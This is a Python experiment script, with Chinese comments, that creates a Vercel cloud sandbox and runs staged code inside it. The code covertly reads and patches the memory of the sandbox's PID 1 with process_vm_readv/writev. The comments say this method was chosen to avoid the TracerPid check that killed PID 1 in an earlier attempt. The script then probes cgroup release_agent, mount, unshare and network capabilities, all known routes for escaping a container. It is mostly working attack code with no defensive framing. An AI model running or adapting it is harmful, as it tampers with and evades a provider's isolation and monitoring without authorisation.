# 实验J239: process_vm_readv/writev隐蔽读写(不attach) + mount/cgroup 单独测
# 判读: J238 证实 attach→TracerPid变化→PID1被杀. PVR/PVW不碰TracerPid, 应安全.
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj239"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) process_vm_readv 读 PID1 内存 (不attach, 不碰TracerPid)
CODE_A = r'''
import ctypes
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.process_vm_readv.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_readv.restype = ctypes.c_ssize_t
def p(*a): print(" ".join(str(x) for x in a), flush=True)
# 读 text 段 (ELF header 0x400000)
buf = ctypes.create_string_buffer(16)
local = Iovec(ctypes.cast(buf, ctypes.c_void_p), 16)
remote = Iovec(0x400000, 16)
n = libc.process_vm_readv(1, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
p("PVR_ELF", n, "errno", ctypes.get_errno(), "hex", buf.raw[:8].hex())
# 读 patch 点 0x83afe0
buf2 = ctypes.create_string_buffer(5)
local2 = Iovec(ctypes.cast(buf2, ctypes.c_void_p), 5)
remote2 = Iovec(0x83afe0, 5)
n2 = libc.process_vm_readv(1, ctypes.byref(local2), 1, ctypes.byref(remote2), 1, 0)
p("PVR_PATCH", n2, "errno", ctypes.get_errno(), "hex", buf2.raw.hex())
# TracerPid 确认自己没变
p("TRACER", open("/proc/self/status").read().split("TracerPid:")[1].split("\n")[0].strip())
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_PVR", timeout=100)

# B) process_vm_writev 写 patch (验证隐蔽写生效)
CODE_B = r'''
import ctypes
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.process_vm_readv.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_readv.restype = ctypes.c_ssize_t
libc.process_vm_writev.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_writev.restype = ctypes.c_ssize_t
def p(*a): print(" ".join(str(x) for x in a), flush=True)
data = bytes.fromhex("31c0909090")
wbuf = ctypes.create_string_buffer(data, 5)
wlocal = Iovec(ctypes.cast(wbuf, ctypes.c_void_p), 5)
remote = Iovec(0x83afe0, 5)
n = libc.process_vm_writev(1, ctypes.byref(wlocal), 1, ctypes.byref(remote), 1, 0)
p("PVW", n, "errno", ctypes.get_errno())
# 读回
buf = ctypes.create_string_buffer(5)
local = Iovec(ctypes.cast(buf, ctypes.c_void_p), 5)
n2 = libc.process_vm_readv(1, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
p("PVW_NEW", n2, buf.raw.hex())
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_PVW", timeout=100)

# C) mount tmpfs 单独测
CODE_C = r'''
import subprocess
def p(*a): print(" ".join(str(x) for x in a), flush=True)
r = subprocess.run("mkdir -p /tmp/xx && mount -t tmpfs tmpfs /tmp/xx && echo MOUNT_OK && touch /tmp/xx/f && ls /tmp/xx/f && umount /tmp/xx && echo UMOUNT_OK", shell=True, capture_output=True, text=True, timeout=10)
p("MOUNT", "rc", r.returncode, (r.stdout + r.stderr)[:300].replace(chr(10), "|"))
r = subprocess.run("grep -E 'tmpfs|overlay|ext4|xfs|btrfs' /proc/self/mountinfo | head -12", shell=True, capture_output=True, text=True, timeout=10)
p("MOUNTINFO", (r.stdout + r.stderr)[:800].replace(chr(10), "|"))
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_MOUNT", timeout=100)

# D) cgroup 探测
CODE_D = r'''
import subprocess
def p(*a): print(" ".join(str(x) for x in a), flush=True)
r = subprocess.run("cat /proc/self/cgroup; echo ---; ls -la /sys/fs/cgroup/ 2>&1 | head -20", shell=True, capture_output=True, text=True, timeout=10)
p("CGROUP", (r.stdout + r.stderr)[:700].replace(chr(10), "|"))
r = subprocess.run("find /sys/fs/cgroup -maxdepth 3 -name 'release_agent' -o -name 'notify_on_release' 2>/dev/null | head; echo ---; cg=$(cat /proc/self/cgroup | head -1 | cut -d: -f3); echo CGPATH=$cg; ls -la /sys/fs/cgroup$cg 2>&1 | head -8", shell=True, capture_output=True, text=True, timeout=10)
p("RA", (r.stdout + r.stderr)[:700].replace(chr(10), "|"))
p("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_CGROUP", timeout=100)

# E) 验证 patch 生效 + 其他 root 原语 (nsenter/unshare/ip link)
CODE_E = r'''
import subprocess
def p(*a): print(" ".join(str(x) for x in a), flush=True)
# 30001 行为 (patch 后应 404 活)
import urllib.request, urllib.error
try:
    req = urllib.request.Request("http://127.0.0.1:30001/x", data=b"{}", method="POST")
    req.add_header("Content-Type", "application/json")
    r = urllib.request.urlopen(req, timeout=4)
    p("G30001", r.status, r.read()[:80])
except urllib.error.HTTPError as e:
    p("G30001", e.code)
except Exception as e:
    p("G30001 EXC", type(e).__name__, str(e)[:80])
# unshare 能力
for cmd in ("unshare -Ur true && echo UNSHARE_OK", "unshare -Urm true && echo UNSHARE2_OK",
            "ip link add dummy0 type dummy && echo IPLINK_OK && ip link del dummy0"):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    p("CAP", cmd[:30], "rc", r.returncode, (r.stdout + r.stderr)[:120].replace(chr(10), "|"))
p("DONE_E", flush=True)
'''
run_cmd(sid, CODE_E, "E_ROOTCAPS", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
